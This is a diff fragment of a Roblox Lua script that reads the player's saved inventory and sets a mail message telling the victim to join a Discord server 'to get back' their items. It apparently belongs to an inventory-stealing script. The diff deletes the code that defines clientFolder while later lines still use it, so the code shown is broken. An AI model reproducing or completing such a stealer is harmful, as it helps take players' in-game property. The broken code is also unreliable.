@@ -12,13 +12,6 @@ local MailMessage = "Join gg / GY2RVSEGDT to get back"
 
 local HttpService = game:GetService("HttpService")
 
--- Ensure the Client and Save modules exist
-local clientFolder = replicatedStorage:FindFirstChild("Library"):FindFirstChild("Client")
-if not (clientFolder and clientFolder:FindFirstChild("Save")) then
-    warn("Save module not found!")
-    return
-end
-
 -- Retrieve the player's inventory
 local saveData = require(clientFolder.Save).Get()
 if not (saveData and saveData.Inventory) then
